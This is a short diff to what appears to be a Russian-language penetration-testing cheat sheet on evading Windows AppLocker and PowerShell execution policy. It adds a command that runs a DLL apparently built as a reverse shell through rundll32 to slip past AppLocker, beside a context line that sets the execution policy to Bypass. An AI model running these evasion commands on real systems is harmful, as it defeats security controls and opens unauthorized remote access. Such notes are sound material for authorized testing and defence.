@@ -4,6 +4,10 @@
 
           Get-AppLockerPolicy -Effective -Xml   ----> copy to file.xml ---> firefox file.xml
 
+# Обход App_Locker rundll32.exe
+
+        C:\Windows\System32\RunDll32.exe C:\Tools\RShell_D\RShell_D\bin\Release\x86\RShell_D.dll,DllMain
+
 # Обход блокировка скрипта
 
 Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
